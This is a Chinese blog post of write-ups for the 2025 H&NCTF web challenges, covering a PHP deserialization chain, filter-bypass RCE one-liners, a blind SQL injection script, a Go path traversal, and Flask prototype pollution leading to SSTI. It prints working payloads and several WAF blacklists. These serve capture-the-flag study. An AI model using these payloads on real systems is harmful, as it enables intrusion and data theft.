---
title: 2025H&amp;NCTF web
date: 2025-06-09 23:32:24
updated: 2025-09-02 21:31:37
author: Xebdria
categories:
  - wp
  - 比赛
---

{% raw %}
## ez_php

```php
<?php
error_reporting(0);
class GOGOGO{
    public $dengchao;
    function __destruct(){
        echo "Go Go Go~ 出发喽！" . $this->dengchao;
    }
}
class DouBao{
    public $dao;
    public $Dagongren;
    public $Bagongren;
    function __toString(){
        if( ($this->Dagongren != $this->Bagongren) && (md5($this->Dagongren) === md5($this->Bagongren)) && (sha1($this->Dagongren)=== sha1($this->Bagongren)) ){
            call_user_func_array($this->dao, ['诗人我吃！']);
        }
    }
}
class HeiCaFei{
    public $HongCaFei;
    function __call($name, $arguments){
        call_user_func_array($this->HongCaFei, [0 => $name]);
    }
}

if (isset($_POST['data'])) {
    $temp = unserialize($_POST['data']);
    throw new Exception('What do you want to do?');
} else {
    highlight_file(__FILE__);
}
?>
```

挺简单的链子，主要就是注意到 throw new Exception('What do you want to do?');，我们需要绕过这个GC回收，然后触发__destruct()方法让链子走下去。还有一个地方就是

```
function __toString(){
        if( ($this->Dagongren != $this->Bagongren) && (md5($this->Dagongren) === md5($this->Bagongren)) && (sha1($this->Dagongren)=== sha1($this->Bagongren)) ){
            call_user_func_array($this->dao, ['诗人我吃！']);
        }
    }
```

我们直接用数组可以绕过，然后我们就可以开始写了

```php
<?php
error_reporting(0);
class GOGOGO{
    public $dengchao;
    function __destruct(){
        echo "Go Go Go~ 出发喽！" . $this->dengchao;
    }
}
class DouBao{
    public $dao;
    public $Dagongren=[1];
    public $Bagongren=[2];
    function __toString(){
        if( ($this->Dagongren != $this->Bagongren) && (md5($this->Dagongren) === md5($this->Bagongren)) && (sha1($this->Dagongren)=== sha1($this->Bagongren)) ){
            call_user_func_array($this->dao, ['诗人我吃！']);
        }
    }
}
class HeiCaFei{
    public $HongCaFei;
    function __call($name, $arguments){
        call_user_func_array($this->HongCaFei, [0 => $name]);
    }
}

$a=new GOGOGO();
$b=new DouBao();
$c=new HeiCaFei();

$a->dengchao=$b;
$b->dao=[$c,"cat /ofl1111111111ove4g"];
$c->HongCaFei="system";
$arr = array($a,0);
echo serialize($arr);
#a:2:{i:0;O:6:"GOGOGO":1:{s:8:"dengchao";O:6:"DouBao":3:{s:3:"dao";a:2:{i:0;O:8:"HeiCaFei":1:{s:9:"HongCaFei";s:6:"system";}i:1;s:23:"cat /ofl1111111111ove4g";}s:9:"Dagongren";a:1:{i:0;i:1;}s:9:"Bagongren";a:1:{i:0;i:2;}}}i:1;i:0;}
```

我们把结果最后面的i:1;i:0;改为i:0;i:0;

```
data=a:2:{i:0;O:6:"GOGOGO":1:{s:8:"dengchao";O:6:"DouBao":3:{s:3:"dao";a:2:{i:0;O:8:"HeiCaFei":1:{s:9:"HongCaFei";s:6:"system";}i:1;s:23:"cat /ofl1111111111ove4g";}s:9:"Dagongren";a:1:{i:0;i:1;}s:9:"Bagongren";a:1:{i:0;i:2;}}}i:0;i:0;}
```

## DeceptiFlag

一开始看到这个题解那么少以为挺难的就没去看题目了，刚好停电就睡觉去了...填了xiyangyang和huitailang后没反应，那我们可以试试抓包，抓包可能会给你意想不到的的惊喜

![](http://xendria.icu/wp-content/uploads/2025/06/b449b50b-29fd-49cf-94d5-1d05618a9b92.png)

额，是填两个...然后呢我们得到了一个返回包，我们注意到这两个地方

![](http://xendria.icu/wp-content/uploads/2025/06/ac5de0205ae3ef320d27e5e675356f0a-1024x355.png)

当时比赛没看到tips.php直接全剧终了，我们进去

![](http://xendria.icu/wp-content/uploads/2025/06/de3f86fc0b1327f17601061060f7990c.png)

看到了file再结合给了flag的目录，我们可以试试伪协议读取?file=php://filter/convert.base64-encode/resource=/var/flag/flag.txt结果还真是这样子...

## Really_Ez_Rce

```php
<?php
header('Content-Type: text/html; charset=utf-8');
highlight_file(__FILE__);
error_reporting(0);

if (isset($_REQUEST['Number'])) {
    $inputNumber = $_REQUEST['Number'];
    
    if (preg_match('/\d/', $inputNumber)) {
        die("不行不行,不能这样");
    }

    if (intval($inputNumber)) {
        echo "OK,接下来你知道该怎么做吗";
        
        if (isset($_POST['cmd'])) {
            $cmd = $_POST['cmd'];
            
            if (!preg_match(
                '/wget|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\\*|sort|zip|mod|sl|find|sed|cp|mv|ty|php|tee|txt|grep|base|fd|df|\\\\|more|cc|tac|less|head|\.|\{|\}|uniq|copy|%|file|xxd|date|\[|\]|flag|bash|env|!|\?|ls|\'|\"|id/i',
                $cmd
            )) {
                echo "你传的参数似乎挺正经的,放你过去吧
";
                system($cmd);
            } else {
                echo "nonono,hacker!!!";
            }
        }
    }
}
```

第一层Number直接用数组绕过了  Number[]=1第二层我们看到ban了很多的东西，但是仔细一看会发现=和;和`居然没ban，那我们可以拼接语句了，以及反引号绕过了

```
找目录
l``s /
l$@s /
然后就是查看
echo Y2F0IC9mbGFn | base64 -d | sh //用base编码绕过
cmd=a=ca;b=t;c=se;d=d;e=di;f=r;$a$b /$($e$f -1 / | $c$d -n 5p); //查看第五个的内容就是
cat /$(dir -1 / | sed -n 5p)//第一次见到这种姿势，学到学到了
```

## 半成品login

admin admin123弱密码爆破进入然后发现应该是有个sql注入select,空格等被过滤了

![](http://xendria.icu/wp-content/uploads/2025/06/3a278bca-52dd-4118-a940-e8f05434f46f-1-1024x602.png)

```
先附上官方脚本，利用的是table注入
import requests
import time

url = "http://27.25.151.198:42907/login.php"
flagstr = "0123456789:;<=>?@_`abcdefghijklmnopqrstuvwxyz{|}~"
headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}

tempstr = ""
flag = ""

for i in range(1, 15):
    for idx in range(len(flagstr)):  # 使用索引遍历
        x = flagstr[idx]  # 获取当前字符
        prefix = tempstr + x

        # 构造不同的payload
        payload1 = (
            "1%27/**/||(%27{}%27,%271%27,%2711%27,%2711%27)<(table/**/sys.schema_tables_with_full_table_scans/**/limit/**/1)#"
            .format(tempstr + x)
        )
        # 获得数据库名: hnctfweb
        payload2 = (
            "1%27/**/||(%27hnctfweb%27,%27{}%27,%2711%27,%2711%27)<(table/**/sys.schema_tables_with_full_table_scans/**/limit/**/1)#"
            .format(tempstr + x)
        )
        # 获得表名: hnctfuser
        payload3 = (
            "1%27/**/||(%27{}%27,%27%27,%271%27,%2711%27)<(table/**/hnctfuser/**/limit/**/1)#"
            .format(tempstr + x)
        )
        # 获得第一列 id 值: 1
        payload4 = (
            "1%27/**/||(%271%27,%27{}%27,%271%27,%2711%27)<(table/**/hnctfuser/**/limit/**/1)#"
            .format(tempstr + x)
        )
        # 获得第二列 username 值: admin
        payload5 = (
            "1%27/**/||(%271%27,%27admin%27,%27{}%27,%2711%27)<(table/**/hnctfuser/**/limit/**/1)#"
            .format(tempstr + x)
        )
        # 获得第三列 password 值: admin123
        payload6 = (
            "1%27/**/||(%271%27,%27admin%27,%27admin123%27,%27{}%27)<(table/**/hnctfuser/**/limit/**/1)#"
            .format(tempstr + x)
        )
        # 获得第四列值: noflaginhere
        payload7 = (
            "1%27/**/||(%27{}%27,%271%27,%271%27,%271%27)<(table/**/hnctfuser/**/limit/**/1/**/offset/**/1)#"
            .format(tempstr + x)
        )
        # 获得 id 值: 2
        payload8 = (
            "1%27/**/||(%272%27,%27{}%27,%271%27,%271%27)<(table/**/hnctfuser/**/limit/**/1/**/offset/**/1)#"
            .format(tempstr + x)
        )
        # 获得需要的关键用户名: hackerohtii
        payload9 = (
            "1%27/**/||(%272%27,%27hackerohtii%27,%27{}%27,%271%27)<(table/**/hnctfuser/**/limit/**/1/**/offset/**/1)#"
            .format(tempstr + x)
        )

        data = {
            "username": "admin",
            "password": payload8
        }

        res = requests.post(url=url, data=data, allow_redirects=False, headers=headers)

        # 根据返回判断
        if "登陆成功" in res.text:
            continue
        elif "错误" in res.text:
            current_char = flagstr[idx - 1]
            if current_char == '~':
                print("遇到 ~，提前终止，请确认数据是否正确。")
                break
            tempstr += current_char
            flag = tempstr
            print(f"当前结果: {flag}")
            break

print(f"最终结果: {flag}")
```

## Watch

看到提示注意go版本和路径形式，然后我们在所给的文件go.mod发现是go 1.2根据给的信息找到了CVE-2023-45283

![](http://xendria.icu/wp-content/uploads/2025/06/2921507d-4850-4dce-a963-f7c89edb5ca6-1024x635.png)

我们可以加个目录超越..\??\c:\来找他的c盘，发现都是空的，我们找找别的盘

![](http://xendria.icu/wp-content/uploads/2025/06/7f569351-5b1d-4cac-929d-20ee98ee5ba5-1024x290.png)

../??/d:/key.txt 获得key提交获得flag

## 奇怪的咖啡店

给的页面没什么东西，题目给了部分源码，那我们看看源码

```
from flask import Flask, session, request, render_template_string, render_template
import json
import os

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(32).hex()

@app.route('/', methods=['GET', 'POST'])
def store():
    if not session.get('name'):
        session['name'] = ''.join("customer")
        session['permission'] = 0

    error_message = ''
    if request.method == 'POST':
        error_message = '<p style="color: red; font-size: 0.8em;">该商品暂时无法购买，请稍后再试！</p>'

    products = [
        {"id": 1, "name": "美式咖啡", "price": 9.99, "image": "1.png"},
        {"id": 2, "name": "橙c美式", "price": 19.99, "image": "2.png"},
        {"id": 3, "name": "摩卡", "price": 29.99, "image": "3.png"},
        {"id": 4, "name": "卡布奇诺", "price": 19.99, "image": "4.png"},
        {"id": 5, "name": "冰拿铁", "price": 29.99, "image": "5.png"}
    ]

    return render_template('index.html',
                         error_message=error_message,
                         session=session,
                         products=products)

def add():
    pass

@app.route('/add', methods=['POST', 'GET'])
def adddd():
    if request.method == 'GET':
        return '''
            <html>
                <body style="background-image: url('/static/img/7.png'); background-size: cover; background-repeat: no-repeat;">
                    <h2>添加商品</h2>
                    <form id="productForm">
                        <p>商品名称: <input type="text" id="name"></p>
                        <p>商品价格: <input type="text" id="price"></p>
                        <button type="button" onclick="submitForm()">添加商品</button>
                    </form>
                    <script>
                        function submitForm() {
                            const nameInput = document.getElementById('name').value;
                            const priceInput = document.getElementById('price').value;

                            fetch(`/add?price=${encodeURIComponent(priceInput)}`, {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json',
                                },
                                body: nameInput
                            })
                            .then(response => response.text())
                            .then(data => alert(data))
                            .catch(error => console.error('错误:', error));
                        }
                    </script>
                </body>
            </html>
        '''
    elif request.method == 'POST':
        if request.data:
            try:
                raw_data = request.data.decode('utf-8')
                if check(raw_data):
                #检测添加的商品是否合法
                    return "该商品违规，无法上传"
                json_data = json.loads(raw_data)

                if not isinstance(json_data, dict):
                    return "添加失败1"

                merge(json_data, add)
                return "你无法添加商品哦"

            except (UnicodeDecodeError, json.JSONDecodeError):
                return "添加失败2"
            except TypeError as e:
                return f"添加失败3"
            except Exception as e:
                return f"添加失败4"
        return "添加失败5"

def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

app.run(host="0.0.0.0",port=5014)
```

我们喂ai，它说有个明显的原型链污染存在于/add路由

```
merge(json_data, add)//这个是污染点
```

那我们就能去污染他来个任意文件读取？

```
{
  "__globals__": {
    "app": {
      "_static_folder": "/"
    }
  }
}
```

然后发现回显的不是 你无法添加商品哦而是添加失败5，应该是被过滤了，我们能用unicode编码绕过

![](http://xendria.icu/wp-content/uploads/2025/06/2a81a52a-6556-4977-a707-d11e69299af2-1024x551.png)

我们查看源码/static/app/app.py

```
from flask import Flask, session, request, render_template_string, render_template
import json
import os

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(32).hex()

@app.route('/', methods=['GET', 'POST'])
def store():
    if not session.get('name'):
        session['name'] = ''.join("customer")
        session['permission'] = 0

    error_message = ''
    if request.method == 'POST':
        error_message = '<p style="color: red; font-size: 0.8em;">该商品暂时无法购买，请稍后再试！</p>'

    products = [
        {"id": 1, "name": "美式咖啡", "price": 9.99, "image": "1.png"},
        {"id": 2, "name": "橙c美式", "price": 19.99, "image": "2.png"},
        {"id": 3, "name": "摩卡", "price": 29.99, "image": "3.png"},
        {"id": 4, "name": "卡布奇诺", "price": 19.99, "image": "4.png"},
        {"id": 5, "name": "冰拿铁", "price": 29.99, "image": "5.png"}
    ]

    return render_template('index.html',
                         error_message=error_message,
                         session=session,
                         products=products)

def add():
    pass

@app.route('/add', methods=['POST', 'GET'])
def adddd():
    if request.method == 'GET':
        return '''
            <html>
                <body style="background-image: url('/static/img/7.png'); background-size: cover; background-repeat: no-repeat;">
                    <h2>添加商品</h2>
                    <form id="productForm">
                        <p>商品名称: <input type="text" id="name"></p>
                        <p>商品价格: <input type="text" id="price"></p>
                        <button type="button" onclick="submitForm()">添加商品</button>
                    </form>
                    <script>
                        function submitForm() {
                            const nameInput = document.getElementById('name').value;
                            const priceInput = document.getElementById('price').value;

                            fetch(`/add?price=${encodeURIComponent(priceInput)}`, {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json',
                                },
                                body: nameInput
                            })
                            .then(response => response.text())
                            .then(data => alert(data))
                            .catch(error => console.error('错误:', error));
                        }
                    </script>
                </body>
            </html>
        '''
    elif request.method == 'POST':
        if request.data:
            try:
                raw_data = request.data.decode('utf-8')
                if check(raw_data):
                #检测添加的商品是否合法
                    return "该商品违规，无法上传"
                json_data = json.loads(raw_data)

                if not isinstance(json_data, dict):
                    return "添加失败1"

                merge(json_data, add)
                return "你无法添加商品哦"

            except (UnicodeDecodeError, json.JSONDecodeError):
                return "添加失败2"
            except TypeError as e:
                return f"添加失败3"
            except Exception as e:
                return f"添加失败4"
        return "添加失败5"

@app.route('/aaadminnn', methods=['GET', 'POST'])
def admin():
    if session.get('name') == "admin" and session.get('permission') != 0:
        permission = session.get('permission')
        if check1(permission):
            # 检测添加的商品是否合法
            return "非法权限"

        if request.method == 'POST':
            return '<script>alert("上传成功！");window.location.href="/aaadminnn";</script>'

        upload_form = '''
        <h2>商品管理系统</h2>
        <form method=POST enctype=multipart/form-data style="margin:20px;padding:20px;border:1px solid #ccc">
            <h3>上传新商品</h3>
            <input type=file name=file required style="margin:10px">

            <small>支持格式：jpg/png（最大2MB）</small>

            <input type=submit value="立即上传" style="margin:10px;padding:5px 20px">
        </form>
        '''

        original_template = 'Hello admin!!!Your permissions are{}'.format(permission)
        new_template = original_template + upload_form

        return render_template_string(new_template)
    else:
        return "<script>alert('You are not an admin');window.location.href='/'</script>"

def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

def check(raw_data, forbidden_keywords=None):
    """
    检查原始数据中是否包含禁止的关键词
    如果包含禁止关键词返回 True，否则返回 False
    """
    # 设置默认禁止关键词
    if forbidden_keywords is None:
        forbidden_keywords = ["app", "config", "init", "globals", "flag", "SECRET", "pardir", "class", "mro", "subclasses", "builtins", "eval", "os", "open", "file", "import", "cat", "ls", "/", "base", "url", "read"]

    # 检查是否包含任何禁止关键词
    return any(keyword in raw_data for keyword in forbidden_keywords)

param_black_list = ['config', 'session', 'url', '\\', '<', '>', '%1c', '%1d', '%1f', '%1e', '%20', '%2b', '%2c', '%3c', '%3e', '%c', '%2f',
                    'b64decode', 'base64', 'encode', 'chr', '[', ']', 'os', 'cat',  'flag',  'set',  'self', '%', 'file',  'pop(',
                    'setdefault', 'char', 'lipsum', 'update', '=', 'if', 'print', 'env', 'endfor', 'code', '=' ]

# 增强WAF防护
def waf_check(value):
    # 检查是否有不合法的字符
    for black in param_black_list:
        if black in value:
            return False
    return True

# 检查是否是自动化工具请求
def is_automated_request():
    user_agent = request.headers.get('User-Agent', '').lower()
    # 如果是常见的自动化工具的 User-Agent，返回 True
    automated_agents = ['fenjing', 'curl', 'python', 'bot', 'spider']
    return any(agent in user_agent for agent in automated_agents)

def check1(value):

    if is_automated_request():
        print("Automated tool detected")
        return True

    # 使用WAF机制检查请求的合法性
    if not waf_check(value):
        return True

    return False

app.run(host="0.0.0.0",port=5014)
```

多了个/aaadminnn路由，然后看他的waf就应该差不多能猜出来要打ssti

我们可以先在/add界面继续污染，把他过滤的param_black_list给污染了（当然相同的都需要Unicode编码{"__globals__" : {"param_black_list" : ["123"]}}/aaadminnn路由的话看到只有session这个点可以注，然后session有两个参数

```
@app.route('/aaadminnn', methods=['GET', 'POST'])
def admin():
    if session.get('name') == "admin" and session.get('permission') != 0:
        permission = session.get('permission')
        if check1(permission):
            # 检测添加的商品是否合法
            return "非法权限"
```

name和permission，但是我们不知道它的key要怎么伪造呢，我们又想到了原型链污染，我们可以把这个随机的key污染成一个我们想要的key，SECRET_KEY 一般存储在 Flask 应用对象的 `config` 属性，那我们就可以写了

```
{"__globals__" : {"app" : {"config" : {"SECRET_KEY":"111"}}}}
污染了后就是ssti了

from flask.sessions import SecureCookieSessionInterface

class MockApp:
    def __init__(self):
        self.secret_key = '111'
        self.config = {
            'SECRET_KEY': self.secret_key,
            'SECRET_KEY_FALLBACKS': [] 
        }

session_data = {
    "name": "admin",
    "permission": '{{self.__init__.__globals__.__builtins__["__import__"]("os").popen("cat 4flloog").read()}}'
}

serializer = SecureCookieSessionInterface().get_signing_serializer(MockApp())
cookie_value = serializer.dumps(session_data)
print(cookie_value)
```

去/aaadminnn改session就行了参考自晨曦师傅的wp[https://chenxi9981.github.io/2025H&NCTF_WP/](https://chenxi9981.github.io/2025H&NCTF_WP/)

## 小结

还没写完....
{% endraw %}
